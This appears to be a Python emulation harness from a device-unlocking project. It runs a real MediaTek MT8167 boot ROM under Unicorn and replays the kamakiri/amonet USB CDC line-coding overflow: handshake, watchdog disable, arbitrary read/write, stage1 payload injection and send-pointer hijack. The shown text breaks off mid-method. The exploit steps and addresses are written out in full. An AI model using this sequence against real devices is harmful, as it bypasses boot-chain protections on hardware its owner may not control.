# Donor: WS/tools/kamakiri/emu/harness.py
# Upstream: R0rt1z2/kamakiri
# Copied verbatim: 2026-10-31 (Task 7 lazy paths: DEFAULT_ROM/
#   DEFAULT_STAGE1 module globals -> default_rom()/default_stage1()
#   resolving through resources)

"""Layer-1 Unicorn harness: real MT8167/MT8516/MT8362 BROM + the amonet
CDC SET_LINE_CODING overflow.

What is REAL (mapped from no-alexa/brom_MT8167_MT8516_MT8362_8167.bin at 0x0):
    - the USBDL handshake loop        fcn 0x5ba8
    - the command dispatcher          0xdff6 (entered exactly like fcn 0xcb5a)
    - every I/O primitive it uses     0x5e98/0x5eb2 (ptr_recv/ptr_send),
                                      0x7396/0x72b4/0x7320 (byte ring + flush)
    - the 0xDA register-access cmd    fcn 0xd6f2 (reads/writes base 0x40,
                                      window [0x40, 0x40404040))
    - the USB interrupt poller        fcn 0x6d5e and every EP0 handler:
                                      0x679e -> 0x6714 -> CDC class handler
                                      0x74a8 -> SET_LINE_CODING data stage
                                      0x746e, which copies COUNT0 bytes into
                                      the 8-byte line-coding buffer at
                                      0x1033A8 with no bounds check
                                      (THE overflow), and GET_LINE_CODING
                                      0x74e6/0x629e/0x639e
    - the handler installer           fcn 0xd0da(1) (runs at seed time)
    - the compiled stage1 payload     brom-payload/stage1/stage1.bin at 0x100A00

What is MODELED (hardware only):
    - MUSB USB2 MAC registers at 0x11100000 (emu/usb_model.py; the two FIFO
      pump helpers 0x6b9a/0x6bc2 are emulated at the function boundary
      because a FIFO port cannot live in flat memory)
    - UART at 0x11005000 (THR) / 0x11005014 (LSR, constant 0x20)
    - watchdog at 0x10007000 (MODE) / 0x10007008 (RESTART, magic 0x1971)
    - GPT timer at 0x10008048 (free-running, advances 1 tick/instruction)
    - eFuse page 0x10009000 left zeroed (unfused/donut-style SBC state; the
      CDC overflow itself is pre-DA-dispatch either way, see the task report)

Seeded SRAM cells reproduce the BROM's post-enumeration USBDL state (values
cross-checked against the live snapshot no-alexa/sram_...bin and the static
analysis in recovery-notes/brom-analysis.md); everything else the ROM builds
itself through the real code paths above.

The host sequence replayed by run_cdc_overflow() mirrors
modules/load_payload.py byte-for-byte (the exploit's byte-math authority):
ptr_usbdl 0xd2e4, ptr_da 0xd7ac, stage1 -> 0x100A00, and the ptr_send
overwrite at *( *(0xd2e4) + 8 ) = 0x1029AC.
"""
import struct
from pathlib import Path

from unicorn import (Uc, UcError, UC_ARCH_ARM, UC_MODE_THUMB, UC_HOOK_CODE,
                     UC_HOOK_MEM_INVALID, UC_HOOK_MEM_READ, UC_HOOK_MEM_WRITE)
from unicorn.arm_const import (UC_ARM_REG_R0, UC_ARM_REG_R1, UC_ARM_REG_R2,
                               UC_ARM_REG_R3, UC_ARM_REG_SP, UC_ARM_REG_LR,
                               UC_ARM_REG_PC)

from crumpet_emu.core.devices import (TIMER_REG as GPT_TIMER, UART_LSR,
                                      UART_THR, WDT_BASE)
from crumpet_emu.core.session import MAGIC_RET
from crumpet_emu.flash.nand import NandChip
from crumpet_emu.resources import own, resolve
from crumpet_emu.usb.model import (USB_BASE, CdcDevice, CSR0_RXPKTRDY,
                                   RXCSR_RXPKTRDY, TXCSR_TXPKTRDY)


def default_rom() -> Path:
    """The no-alexa BROM blob (manifest key common:brom) — the donor's
    DEFAULT_ROM module global, resolved lazily so import needs no bins."""
    return resolve('brom', 'common')


def default_stage1() -> Path:
    """The committed stage1 payload (own artifact, no sha gate) — the
    donor's DEFAULT_STAGE1 module global, resolved lazily."""
    return own('stage1.bin')

# NAND page carried by the 0x6101 reply (one spelling with NandChip)
NAND_PAGE_TOTAL = NandChip.PAGE_DATA + NandChip.PAGE_SPARE

# ---- BROM code entry points (verified against the dump) -------------------
HANDSHAKE_FCN = 0x5BA8        # USBDL handshake loop; returns 1 on match
DISPATCHER = 0xDFF6           # command dispatcher (never returns)
INSTALLER = 0xD0DA            # usbdl handler installer; arg 1 = BROM mode
READ_FIFO_FCN = 0x6B9A        # (ep, len, buf) — emulated (FIFO port)
WRITE_FIFO_FCN = 0x6BC2       # (ep, len, buf) — emulated (FIFO port)

# ---- exploit constants (modules/load_payload.py) --------------------------
HANDSHAKE_PATTERN = b'\xA0\x0A\x50\x05'
ROM_PTR_USB = 0xD2E4          # *(0xd2e4) = usbdl struct address
ROM_PTR_DA = 0xD7AC           # brom_register_access constant table
STAGE1_LOAD = 0x00100A00
STAGE2_LOAD = 0x00201000      # stage2 SRAM window (amonet load_payload.py)

# ---- SRAM layout -----------------------------------------------------------
USB_STRUCT = 0x001029A4       # usbdl handler struct (installed by 0xd0da)
PTR_SEND_CELL = USB_STRUCT + 8
CTRL_STRUCT = 0x0010339C      # CDC control struct
OVERFLOW_FIELD = CTRL_STRUCT + 0x14     # ctrl+0x14, smashed at linecode+8
LINECODE_BUF = CTRL_STRUCT + 0x0C       # 8-byte CDC line-coding buffer
USB_EP_TABLE = 0x001032A0     # endpoint handler table
CDC_STATE = 0x0010375C        # descriptor table + EP0 state
SP_INIT = 0x102738          # reset stub: SP = *(ROM 0x11A68) - 8
# MAGIC_RET (return sentinel, mapped, never executed) and the MMIO block
# below: values donor-verbatim (donor lk_emu.py); single-sourced from core
# (crumpet_emu.core.session / crumpet_emu.core.devices).

# ---- MMIO ------------------------------------------------------------------
NFI_BASE = 0x11001000          # raw-NAND controller window (Task 5)

# stop reasons that end the emulation for good; resume() refuses them
# ('stage1-online' and 'io' are interactive checkpoints, not endings)
TERMINAL_STOPS = frozenset({'fault', 'wdt-reboot', 'budget',
                            'handshake-failed'})

# ---- post-enumeration seeds (snapshot no-alexa/sram_*.bin @ 0x32A0 etc.) ---
EP_RESET_HDLR = 0x0000682F    # [ep_table+4]   bus-reset handler
EP0_HDLR = 0x0000679F         # [ep_table+16]  control transfer handler
EP1_TX_HDLR = 0x0000767B      # [ep_table+20]  bulk TX-done handler
EP1_RX_HDLR = 0x00007639      # [ep_table+36]  bulk RX handler
EP_STRUCT_A = 0x00103830      # ctrl+0x18 (bulk ep struct, TX side)
EP_STRUCT_B = 0x00103878      # ctrl+0x1C (bulk ep struct, RX side)
EP_STRUCT_C = 0x001038E4      # ctrl+0x14
CDC_IFC0_HDLR = 0x000074A9    # [CDC_STATE + 0x28] class-request handler
ENUM_STATE = CDC_STATE + 0x1E5          # 3 = ENUM_DONE
USB_CFG_READY = 0x0010338C              # 1
HANDSHAKE_PATTERN_SRAM = 0x0010AC0     # a0 0a 50 05 (boot-copied)
CABLE_PRESENT = 0x001028D4              # fcn 0x5ee4 result byte
CONFIG_DESC = 0x00103774                # config descriptor address
DEVICE_DESC_BYTES = (b'\x12\x01\x10\x01\x02\x00\x00\x40\x8d\x0e\x03\x00'
                     b'\x00\x01\x00\x00\x00\x01')
CONFIG_DESC_BYTES = b'\x09\x02\x43\x00\x02\x01\x00\x80\x00'
# what GET_LINE_CODING returns before the first SET (the seeded defaults
# above are what the ROM itself installs at enumeration, fcn 0x7222)
INITIAL_LINECODE = struct.pack('<I', 115200) + bytes([0, 0, 8]) + b'\x00'

STAGE1_BANNER = b'Entered 1ST stage payload'
STAGE1_PATTERN = b'\xA1\xA2\xA3\xA4'
HANDSHAKE_LOOP_HEAD = 0x5BD6   # first poll of the handshake recv loop
                               # (fcn 0x7288 drained stale EP1 data above it)


class Watchdog:
    """Modeled MT8167 watchdog @0x10007000.

    A MODE write with ENABLE (bit 4) arms the timeout counter; a RESTART
    write of 0x1971 (the BROM's kick, fcn 0xc5e8, and amonet's low-level
    kick) resets it; expiry raises exactly one 'reboot' event per arming.
    Tasks 3 and 7 reuse this mechanism unchanged.
    """

    RESTART_MAGIC = 0x1971
    MODE_ENABLE = 0x10
    # 22 s window @ 13 MHz (brom-analysis.md §9: a payload that stops
    # kicking for >= 22 s would reset)
    DEFAULT_TIMEOUT_TICKS = 22 * 13_000_000

    def __init__(self, timeout_ticks=None):
        self.timeout = timeout_ticks if timeout_ticks is not None \
            else self.DEFAULT_TIMEOUT_TICKS
        self.mode = 0
        self.enabled = False
        self.deadline = None
        self.kicks = 0
        self.reboots = []
        self._expired = False

    def write_mode(self, value, now):
        self.mode = value & 0xFFFFFFFF
        enable = bool(self.mode & self.MODE_ENABLE)
        if enable:
            if not self.enabled or self.deadline is None:
                self.enabled = True
                self._expired = False
                self.deadline = now + self.timeout
        else:
            self.enabled = False
            self.deadline = None

    def write_restart(self, value, now):
        if value == self.RESTART_MAGIC:
            self.kicks += 1
            if self.enabled:
                self.deadline = now + self.timeout

    def poll(self, now):
        """Return 'reboot' exactly once when the modeled window expires."""
        if (self.enabled and not self._expired and self.deadline is not None
                and now >= self.deadline):
            self._expired = True
            self.reboots.append(now)
            return 'reboot'
        return None


class BromHarness:
    """Real-BROM emulation of the amonet stage1 exploit (layer 1)."""

    def __init__(self, rom_path=None, budget=60_000_000, nfi=None):
        if rom_path is None:            # lazy: the donor's DEFAULT_ROM
            rom_path = default_rom()    # was read from a module global
        self.rom_path = Path(rom_path)
        self.rom = self.rom_path.read_bytes()
        if len(self.rom) != 0x20000:
            raise ValueError(f'unexpected BROM size {len(self.rom)}')
        self.budget = budget
        self.nfi = nfi               # emu.nfi_model.NfiModel or None
        self.usb_mac = mac = CdcDevice().mac
        self.cdc = CdcDevice(mac)
        self.uart_out = bytearray()
        self.wdt = Watchdog()
        self.now = 0
        self.instr_count = 0
        self.stop_reason = None
        self.last_pc = 0
        self.events = []
        self._need_fixup = True
        self._online = None
        self._cell_hist = {PTR_SEND_CELL: [], OVERFLOW_FIELD: []}
        self._cell_pending = set()   # cells whose write must be recorded
                                     # post-commit (UC write hooks fire early)
        # Host traffic is held until the real ROM reaches the handshake
        # loop (the BROM discards any EP1 data already pending when it
        # enters fcn 0x5ba8, via the 0x7288 drain), then the rest is
        # released once the handshake has matched.
        self._pending = []          # ('ep1', data) | ('ctrl', bm, req, wv, wi, data)
        self._handshake_released = False
        self._live = False
        self._setup_uc()

    # ------------------------------------------------------------------ uc --
    def _setup_uc(self):
        uc = self.uc = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
        uc.mem_map(0x0, 0x20000)                    # BROM
        uc.mem_write(0x0, self.rom)
        uc.mem_map(0x100000, 0x20000)               # SRAM0 + sentinel stack
        uc.mem_map(STAGE2_LOAD, 0x8000)             # stage2 SRAM window
        uc.mem_map(0x10007000, 0x1000)              # watchdog
        uc.mem_map(0x10008000, 0x1000)              # GPT timer
        uc.mem_map(0x10009000, 0x1000)              # eFuse (zeroed)
        uc.mem_map(0x11005000, 0x1000)              # UART
        uc.mem_map(USB_BASE, 0x1000)                # USB MAC
        uc.mem_write(UART_LSR, struct.pack('<I', 0x20))   # THR always empty

        uc.hook_add(UC_HOOK_CODE, self._hook_code)
        uc.hook_add(UC_HOOK_MEM_INVALID, self._hook_invalid)
        uc.hook_add(UC_HOOK_MEM_READ, self._hook_timer_read,
                    begin=GPT_TIMER, end=GPT_TIMER + 3)
        uc.hook_add(UC_HOOK_MEM_WRITE, self._hook_usb_write,
                    begin=USB_BASE, end=USB_BASE + 0xFF)
        uc.hook_add(UC_HOOK_MEM_WRITE, self._hook_uart_write,
                    begin=UART_THR, end=UART_THR + 3)
        uc.hook_add(UC_HOOK_MEM_WRITE, self._hook_wdt_write,
                    begin=WDT_BASE, end=WDT_BASE + 0x40)
        uc.hook_add(UC_HOOK_MEM_WRITE, self._hook_cell_write,
                    begin=PTR_SEND_CELL, end=PTR_SEND_CELL + 3)
        uc.hook_add(UC_HOOK_MEM_WRITE, self._hook_cell_write,
                    begin=OVERFLOW_FIELD, end=OVERFLOW_FIELD + 3)
        # NFI controller window: always mapped (the block exists on the
        # SoC either way); only a model-backed harness answers on it.
        # Reads are served by rewriting the cell in the read hook (the
        # GPT-timer mechanism), so the emulated load returns the model's
        # live value; without a model the window is a dead zero page and
        # any NAND op would stall on a never-ready FIFO, visibly.
        uc.mem_map(NFI_BASE, 0x1000)
        if self.nfi is not None:
            uc.hook_add(UC_HOOK_MEM_READ, self._hook_nfi_read,
                        begin=NFI_BASE, end=NFI_BASE + 0xFFF)
            uc.hook_add(UC_HOOK_MEM_WRITE, self._hook_nfi_write,
                        begin=NFI_BASE, end=NFI_BASE + 0xFFF)
        self._seed()

    def _w32(self, addr, value):
        self.uc.mem_write(addr, struct.pack('<I', value & 0xFFFFFFFF))

    def _w8(self, addr, value):
        self.uc.mem_write(addr, bytes([value & 0xFF]))

    def _seed(self):
        """Reproduce the BROM's post-enumeration USBDL state, then let the
        real handler installer (fcn 0xd0da) build the usbdl struct."""
        self._w32(USB_EP_TABLE + 4, EP_RESET_HDLR)
        self._w32(USB_EP_TABLE + 16, EP0_HDLR)
        self._w32(USB_EP_TABLE + 20, EP1_TX_HDLR)
        self._w32(USB_EP_TABLE + 36, EP1_RX_HDLR)
        # CDC control struct: endpoint-struct pointers and their +20 cells
        self._w32(CTRL_STRUCT + 0x14, EP_STRUCT_C)
        self._w32(CTRL_STRUCT + 0x18, EP_STRUCT_A)
        self._w32(CTRL_STRUCT + 0x1C, EP_STRUCT_B)
        self._w32(CTRL_STRUCT + 0x00, EP_STRUCT_A + 20)   # bulk TX ep cell
        self._w32(CTRL_STRUCT + 0x04, EP_STRUCT_B + 20)   # bulk RX ep cell
        self._w32(CTRL_STRUCT + 0x08, EP_STRUCT_C + 20)
        self._w8(EP_STRUCT_A + 20, 1)    # ep number = 1
        self._w8(EP_STRUCT_B + 20, 1)
        # line-coding defaults the ROM installs at enumeration (fcn 0x7222)
        self.uc.mem_write(LINECODE_BUF, INITIAL_LINECODE[:8])
        self._w32(USB_CFG_READY, 1)
        self._w8(ENUM_STATE, 3)          # ENUM_DONE
        self._w8(HANDSHAKE_PATTERN_SRAM, HANDSHAKE_PATTERN[0])
        self._w8(HANDSHAKE_PATTERN_SRAM + 1, HANDSHAKE_PATTERN[1])
        self._w8(HANDSHAKE_PATTERN_SRAM + 2, HANDSHAKE_PATTERN[2])
        self._w8(HANDSHAKE_PATTERN_SRAM + 3, HANDSHAKE_PATTERN[3])
        self._w8(CABLE_PRESENT, 1)
        # memory-map marker the boot code writes ([0x102960] == 'MEMP');
        # without it the dispatcher's per-command hook (bl 0x376 -> fcn
        # 0xcea6 -> 0xc466) dereferences the memory-info struct at
        # 0x10209058, which only exists after the real boot's DRAM probe
        self._w32(0x00102960, 0x504D454D)          # 'MEMP'
        # descriptor table: device + config descriptors and the ifc-0
        # CDC class-request handler (0x74a9), installed at enumeration
        self.uc.mem_write(CDC_STATE, DEVICE_DESC_BYTES)
        self.uc.mem_write(CONFIG_DESC, CONFIG_DESC_BYTES)
        self._w32(CDC_STATE + 0x28, CDC_IFC0_HDLR)
        self._w32(CDC_STATE + 0x1D8, CONFIG_DESC)   # config-desc pointer
        # usbdl handler struct from the real installer code
        self._call(INSTALLER, args=(1,))

    # --------------------------------------------------------------- hooks --
    def _hook_code(self, uc, address, size, user):
        self.instr_count += 1
        self.now += 1
        self.last_pc = address
        if self._cell_pending:
            for cell in tuple(self._cell_pending):
                self._record_cell(cell)
            self._cell_pending.clear()
        if self._need_fixup:
            self._apply_fixups()
        if address == READ_FIFO_FCN or address == WRITE_FIFO_FCN:
            self._emulate_fifo(uc, address)
            return
        if self._pending and address == HANDSHAKE_LOOP_HEAD \
                and not self._handshake_released:
            self._handshake_released = True
            self._release_one()      # the handshake pattern packet
        if self.usb_mac.dirty:
            self.usb_mac.dirty = False
            if self._online is None:
                if self._stage1_online():
                    self.stop_reason = 'stage1-online'
                    uc.emu_stop()
                    return
            else:
                # interactive (stage1/stage2 command loop): the device
                # produced output or host input landed — checkpoint so the
                # host can consume the reply before sending the next one
                self.stop_reason = 'io'
                uc.emu_stop()
                return
        ev = self.wdt.poll(self.now)
        if ev is not None:
            self.stop_reason = f'wdt-{ev}'
            self.events.append(f'watchdog {ev} at tick {self.now}')
            uc.emu_stop()
            return
        if self.instr_count > self.budget:
            self.stop_reason = 'budget'
            self.events.append(f'instruction budget exhausted, '
                               f'last pc={self.last_pc:#x}')
            uc.emu_stop()

    def _emulate_fifo(self, uc, which):
        """Emulate fcn 0x6b9a/0x6bc2 at the function boundary (the FIFO
        ports cannot live in flat memory). Register semantics only."""
        ep = uc.reg_read(UC_ARM_REG_R0)
        length = uc.reg_read(UC_ARM_REG_R1)
        buf = uc.reg_read(UC_ARM_REG_R2) & 0xFFFFFFFF
        if which == READ_FIFO_FCN:
            data = self.usb_mac.read_fifo(ep, length, buf, uc)
            for cell in self._cell_hist:
                if buf <= cell < buf + max(len(data), 1):
                    self._record_cell(cell)
        else:
            self.usb_mac.write_fifo(ep, length, buf, uc)
        self._need_fixup = True
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR) | 1)

    def _apply_fixups(self):
        """Mirror model state into the mapped USB window after every
        instruction that touched it (the engine's raw write lands first;
        no instruction can read the window before the next code hook)."""
        uc = self.uc
        mac = self.usb_mac
        i = mac.index
        if i == 0:
            csr0 = CSR0_RXPKTRDY if mac.ep0_rx_ready else 0
            uc.mem_write(USB_BASE + 0x12, struct.pack('<H', csr0))
            uc.mem_write(USB_BASE + 0x18, struct.pack('<H', mac.count.get(0, 0)))
        else:
            uc.mem_write(USB_BASE + 0x12,
                         struct.pack('<H', mac.txcsr.get(i, 0)))
            uc.mem_write(USB_BASE + 0x16,
                         struct.pack('<H', mac.rxcsr.get(i, 0)))
            uc.mem_write(USB_BASE + 0x18,
                         struct.pack('<H', mac.count.get(i, 0)))
        uc.mem_write(USB_BASE + 0x02, struct.pack('<H', mac.intrtx))
        uc.mem_write(USB_BASE + 0x04, struct.pack('<H', mac.intrrx))
        uc.mem_write(USB_BASE + 0x0A, struct.pack('<B', mac.intrusb))
        self._need_fixup = False

    def _hook_usb_write(self, uc, access, address, size, value, user):
        off = address - USB_BASE
        mac = self.usb_mac
        if off == 0x0E:                       # INDEX
            mac.index = value & 0xF
        elif off == 0x12:                     # CSR0 / TXCSR (indexed)
            ep = mac.index
            if ep == 0:
                mac.ep0_csr_write(value)
            else:
                if value & TXCSR_TXPKTRDY:
                    mac.set_txpktrdy(ep)
                mac.txcsr[ep] = value & ~TXCSR_TXPKTRDY & 0xFFFF
        elif off == 0x16:                     # RXCSR (indexed)
            ep = mac.index
            if ep:
                mac.rxcsr[ep] = value & RXCSR_RXPKTRDY
        elif off == 0x02:                     # INTRTX W1C
            mac.intrtx &= ~value & 0xFFFF
        elif off == 0x04:                     # INTRRX W1C
            mac.intrrx &= ~value & 0xFFFF
        elif off == 0x0A:                     # INTRUSB W1C
            mac.intrusb &= ~value & 0xFF
        self._need_fixup = True

    def _hook_uart_write(self, uc, access, address, size, value, user):
        if address == UART_THR:
            self.uart_out.append(value & 0xFF)
            self.usb_mac.dirty = True

    def _hook_wdt_write(self, uc, access, address, size, value, user):
        off = address - WDT_BASE
        if off == 0:
            self.wdt.write_mode(value, self.now)
        elif off == 8:
            self.wdt.write_restart(value, self.now)

    def _hook_timer_read(self, uc, access, address, size, value, user):
        # free-running counter: refresh the cell so the next read advances
        uc.mem_write(GPT_TIMER, struct.pack('<I', self.now))

    def _hook_cell_write(self, uc, access, address, size, value, user):
        # UC_HOOK_MEM_WRITE fires before the engine commits the store, so
        # defer the recording to the next instruction hook
        for cell in self._cell_hist:
            if cell <= address < cell + 4:
                self._cell_pending.add(cell)

    def _hook_nfi_read(self, uc, access, address, size, value, user):
        fmt = {1: '<B', 2: '<H', 4: '<I'}.get(size)
        if fmt is None:
            self.events.append(f'nfi read size {size} at {address:#x} '
                               f'pc={self.last_pc:#x}')
            self.stop_reason = 'fault'
            uc.emu_stop()
            return
        uc.mem_write(address, struct.pack(
            fmt, self.nfi.read(address - NFI_BASE, size)))

    def _hook_nfi_write(self, uc, access, address, size, value, user):
        self.nfi.write(address - NFI_BASE, value, size)

    def _record_cell(self, cell):
        v = struct.unpack('<I',
                          bytes(self.uc.mem_read(cell, 4)))[0]
        hist = self._cell_hist[cell]
        if not hist or hist[-1] != v:
            hist.append(v)

    def _hook_invalid(self, uc, access, address, size, value, user):
        kind = {16: 'FETCH', 17: 'READ', 18: 'WRITE'}.get(access, access)
        self.events.append(f'unmapped {kind} at {address:#x} size={size} '
                           f'pc={self.last_pc:#x}')
        self.stop_reason = 'fault'
        uc.emu_stop()
        return False

    # ------------------------------------------------------------ execution --
    def _call(self, addr, args=()):
        uc = self.uc
        uc.reg_write(UC_ARM_REG_SP, SP_INIT - 0x800)
        uc.reg_write(UC_ARM_REG_LR, MAGIC_RET | 1)
        for i, v in enumerate(args[:4]):
            uc.reg_write(UC_ARM_REG_R0 + i, v & 0xFFFFFFFF)
        self._need_fixup = True
        uc.emu_start(addr | 1, MAGIC_RET)
        return uc.reg_read(UC_ARM_REG_R0)

    def resume(self):
        """Continue the stopped emulation from the last PC (interactive
        stage1/stage2 command-loop mode). Returns the stop reason of the
        resumed slice: 'io' for a delivery checkpoint, a TERMINAL_STOPS
        member when the emulation is over, or None if it is still running
        (can only happen if no hook fired — the instruction budget bounds
        every slice)."""
        if self.stop_reason in TERMINAL_STOPS:
            return self.stop_reason
        self.stop_reason = None
        self._apply_fixups()
        try:
            self.uc.emu_start(self.last_pc | 1, MAGIC_RET)
        except UcError:
            # _hook_invalid already recorded the fault and stopped us
            if self.stop_reason is None:
                self.stop_reason = 'fault'
        return self.stop_reason

    def _stage1_online(self):
        return (STAGE1_BANNER in self.uart_out
                and self.usb_mac.ep1_in.endswith(STAGE1_PATTERN))

    # ------------------------------------------------------- host sequence --
    def _be(self, value):
        return struct.pack('>I', value & 0xFFFFFFFF)

    def _release_one(self):
        kind = self._pending.pop(0)
        if kind[0] == 'ep1':
            self.cdc.write(kind[1])
        else:
            _, bm, req, wv, wi, data = kind
            self.cdc.ctrl_transfer(bm, req, wv, wi, data)

    def _release_all(self):
        while self._pending:
            self._release_one()

    def _dev_write(self, data):
        if self._live:
            self.cdc.write(data)
        else:
            self._pending.append(('ep1', bytes(data)))

    def _ctrl(self, bm, req, wv, wi, data):
        if self._live:
            self.cdc.ctrl_transfer(bm, req, wv, wi, data)
        else:
            self._pending.append(('ctrl', bm, req, wv, wi, bytes(data)))

    def _kamakiri2(self, addr):
        """One overflow round: oversized SET_LINE_CODING (12-byte payload =
        8-byte linecode + the 4-byte pointer) + GET_DESCRIPTOR kicker, exactly
        as modules/load_payload.py da_read_write() does."""
        self._ctrl(0x21, 0x20, 0, 0,
                   INITIAL_LINECODE + struct.pack('<I', addr))
        self._ctrl(0x80, 0x06, 0x0200, 0, b'\x00' * 9)

    def _da_rw_warmup(self):
        """da_read_write()'s try-block preamble: cmd_da(0,0,1) + read32 of
        the watchdog region."""
        self._dev_write(b'\xDA' + self._be(0) + self._be(0) + self._be(1))
        self._dev_write(b'\xD1' + self._be(WDT_BASE + 0x50) + self._be(1))

    def _da_read(self, address, length):
        assert address >= 0x40
        self._da_rw_warmup()
        for i in range(3):
            self._kamakiri2(ROM_PTR_DA + 8 - 3 + i)
        for i in range(3):
            self._kamakiri2(ROM_PTR_DA - 5 + (3 - i))
        self._dev_write(b'\xDA' + self._be(0) + self._be(address - 0x40)
                        + self._be(length))

    def _da_write(self, address, data):
        assert address >= 0x40
        self._da_rw_warmup()
        for i in range(3):
            self._kamakiri2(ROM_PTR_DA + 8 - 3 + i)
        for i in range(3):
            self._kamakiri2(ROM_PTR_DA - 5 + (3 - i))
        self._dev_write(b'\xDA' + self._be(1) + self._be(address - 0x40)
                        + self._be(len(data)))
        self._dev_write(bytes(data))

    def run_cdc_overflow(self, stage1: bytes):
        """Queue the amonet modules/load_payload.py sequence against the
        real ROM (consumed once expect_stage1_online() runs the emulation):

            handshake (a0 0a 50 05)
            write32(0x10007000, 0x22000000)          # watchdog off
            ptr_send = da_read(0xd2e4, 4) + 8        # = 0x1029AC
            da_write(0x100A00, stage1)
            da_write(ptr_send, pack('<I', 0x100A00)) # hijack ptr_send
        """
        stage1 = bytes(stage1)
        if len(stage1) >= 0xA00:
            raise ValueError('stage1 payload too large')
        # 1. USBDL handshake (modules/device.py Device.handshake)
        self._dev_write(HANDSHAKE_PATTERN)
        # 2. watchdog disable (device.write32 via the 0xD4 dispatcher cmd)
        self._dev_write(b'\xD4' + self._be(WDT_BASE) + self._be(1)
                        + self._be(0x22000000))
        # 3. ptr_send = da_read(*(0xd2e4), 4) + 8; the device replies with
        #    the ROM bytes at 0xd2e4 (0x001029A4 little-endian).
        ptr_send = struct.unpack('<I', self.rom[ROM_PTR_USB:ROM_PTR_USB + 4])[0] + 8
        self._da_read(ROM_PTR_USB, 4)
        # 4. stage1 -> 0x100A00
        self._da_write(STAGE1_LOAD, stage1)
        # 5. hijack ptr_send (check_result=False: no status read after)
        self._da_write(ptr_send, struct.pack('<I', STAGE1_LOAD))

    def expect_stage1_online(self) -> bool:
        """Run the emulation; return True after the stage1 banner appeared
        on the modeled UART and 0xA1A2A3A4 arrived over USB."""
        if self._online is not None:
            return self._online
        self._apply_fixups()
        r = self._call(HANDSHAKE_FCN)
        if r != 1:
            self.events.append(f'handshake returned {r}')
            self.stop_reason = self.stop_reason or 'handshake-failed'
            self._online = False
            return False
        self._live = True
        self._release_all()         # commands + ctrl transfers + payloads
        self._call(DISPATCHER)   # runs until a hook stops the emulation
        self._online = (self.stop_reason == 'stage1-online')
        return self._online

    # ------------------------------------------------------------- inspect --
    @property
    def device_replies(self):
        """Everything the device sent on the bulk IN endpoint."""
        return bytes(self.usb_mac.ep1_in)

    @property
    def ptr_send_history(self):
        """Observed values of the usbdl struct's ptr_send cell (0x1029AC)."""
        return list(self._cell_hist[PTR_SEND_CELL])

    @property
    def overflow_field_history(self):
        """Observed values of ctrl+0x14 (0x1033B0), the field the CDC
        SET_LINE_CODING data stage overflows into."""
        return list(self._cell_hist[OVERFLOW_FIELD])

    def read_mem(self, addr, length):
        return bytes(self.uc.mem_read(addr, length))

    def failure_detail(self):
        lines = [f'stop_reason={self.stop_reason!r}',
                 f'instructions={self.instr_count}',
                 f'last_pc={self.last_pc:#x}',
                 f'uart tail={bytes(self.uart_out[-96:])!r}',
                 f'replies tail={self.device_replies[-64:].hex()}']
        lines += [f'event: {e}' for e in self.events[-12:]]
        return '\n'.join(lines)


class Stage2Error(RuntimeError):
    """A stage2 session command failed (protocol or emulation fault)."""


class Stage2Session:
    """Host-side client for the crumpet stage2 command protocol.

    Takes a harness whose stage1 is online (expect_stage1_online()) and
    boots it into stage2 exactly like modules/load_payload.py: write-mem
    (0x4000) the image to STAGE2_LOAD, then jump (0x4001), then wait for
    the 0xB1B2B3B4 banner dword.

    Wire format (donut convention, the ROM's recv_dword/send_dword pair
    0xD1CB/0xD1FF): every dword big-endian. Request = magic 0xf00dd00d,
    command code, argument dwords, then raw payload bytes. Reply = status
    dword (0xD0D0D0D0 ok / 0xF0F0F0F0 error), then — for commands that
    return data — the data bytes after the ok status. Strictly one
    request->reply pair at a time: the BROM/USB layer discards EP1 data
    pending at handshake entry, so a second command queued before the
    reply lands would be lost.
    """

    MAGIC = 0xf00dd00d
    STATUS_OK = 0xD0D0D0D0
    STATUS_ERR = 0xF0F0F0F0
    STAGE2_BANNER = 0xB1B2B3B4
    # stage1 loader commands (live only while stage2 has not been entered)
    LOADER_WRITE = 0x4000
    LOADER_JUMP = 0x4001

    def __init__(self, harness, stage2_image, load_addr=STAGE2_LOAD):
        if not harness.expect_stage1_online():
            raise Stage2Error('stage1 did not come online:\n'
                              + harness.failure_detail())
        self.h = harness
        image = bytes(stage2_image)
        if load_addr + len(image) > STAGE2_LOAD + 0x8000:
            raise Stage2Error(f'stage2 image ({len(image)} bytes) does not '
                              f'fit the mapped window at {load_addr:#x}')
        # stage1 0x4000: write the image, wait for its ok status
        mark = len(self.h.usb_mac.ep1_in)
        self.h.cdc.write(self._dword(self.MAGIC) + self._dword(self.LOADER_WRITE)
                         + self._dword(load_addr) + self._dword(len(image))
                         + image)
        self._run_until(lambda: len(self.h.usb_mac.ep1_in) - mark >= 4)
        status = self._take_dword(mark)
        if status != self.STATUS_OK:
            raise Stage2Error(f'stage1 rejected the stage2 write '
                              f'(0x{status:08X}):\n{self.h.failure_detail()}')
        # stage1 0x4001: jump — no reply from stage1; stage2 announces
        # itself with the banner dword
        mark = len(self.h.usb_mac.ep1_in)
        self.h.cdc.write(self._dword(self.MAGIC) + self._dword(self.LOADER_JUMP)
                         + self._dword(load_addr))
        self._run_until(lambda: len(self.h.usb_mac.ep1_in) - mark >= 4)
        banner = self._take_dword(mark)
        if banner != self.STAGE2_BANNER:
            raise Stage2Error(f'stage2 did not come online '
                              f'(got 0x{banner:08X}):\n'
                              f'{self.h.failure_detail()}')

    # ------------------------------------------------------------- wire --
    @staticmethod
    def _dword(value):
        return struct.pack('>I', value & 0xFFFFFFFF)

    def _take_dword(self, mark):
        return struct.unpack('>I', self.h.usb_mac.ep1_in[mark:mark + 4])[0]

    def _reply_data_len(self, code, args, status):
        """Bytes that follow the status dword in a reply (Task 6 extends
        this with the write/erase ops)."""
        if status != self.STATUS_OK:
            return 0                     # errors never carry data
        if code == 0x5000:               # mem-read {addr,len} -> len bytes
            return args[1]
        if code == 0x6101:               # page-read {page,len} -> 4352
            return NAND_PAGE_TOTAL
        return 0

    def _run_until(self, cond):
        """Run the emulation until cond() holds; stop at terminal reasons."""
        while not cond():
            reason = self.h.resume()
            if reason is not None and reason != 'io':
                raise Stage2Error(f'emulation stopped ({reason}) before the '
                                  f'reply landed:\n{self.h.failure_detail()}')

    # -------------------------------------------------------------- api --
    def cmd(self, code, *args, payload=None):
        """Send one command, wait for its reply; return (status, data)."""
        request = self._dword(self.MAGIC) + self._dword(code)
        request += b''.join(self._dword(a) for a in args)
        if payload is not None:
            request += bytes(payload)
        mark = len(self.h.usb_mac.ep1_in)
